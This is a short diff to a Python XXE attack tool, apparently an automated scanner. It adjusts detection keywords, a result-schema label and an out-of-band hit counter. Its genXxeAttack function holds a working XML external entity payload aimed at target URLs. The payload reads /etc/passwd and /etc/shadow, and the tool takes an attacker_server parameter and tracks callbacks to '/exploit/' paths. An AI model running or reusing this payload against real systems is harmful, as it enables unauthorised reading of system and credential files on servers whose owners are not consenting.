@@ -80,8 +80,8 @@ def XXEPOINT(target_urls : list , mongo , attacker_server):
 
 def genXxeAttack(target_urls : list , mongo):
     target_files = {
-    "root:x:"  : "file:///etc/passwd",
-    "root:$" : "file:///etc/shadow" 
+    ":x:"  : "file:///etc/passwd",
+    ":$" : "file:///etc/shadow" 
     }
 
     headers = {'Content-Type': 'application/x-www-form-urlencoded',
@@ -90,7 +90,7 @@ def genXxeAttack(target_urls : list , mongo):
     for target_url in target_urls:
         for xxe_keyword, target_file in target_files.items():
 
-            new_schema = schema("LFI")
+            new_schema = schema("GEN")
             new_schema.setUrl(target_url)
             payload = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}"> ]><foo>&xxe;</foo>'''.format(target_file)
         
@@ -168,7 +168,7 @@ def craftResult(result : str):
             new_schema.setContent(line[line.find('/exploit/'):line.find('http/1.1')])
         else :
             if(new_schema.url) :
-                count_use = new_schema.content.count('\n')
+                count_use = new_schema.content.count('/exploit/')
                 new_schema.setisHackOob(count_use)
                 insertItem(new_schema)
 
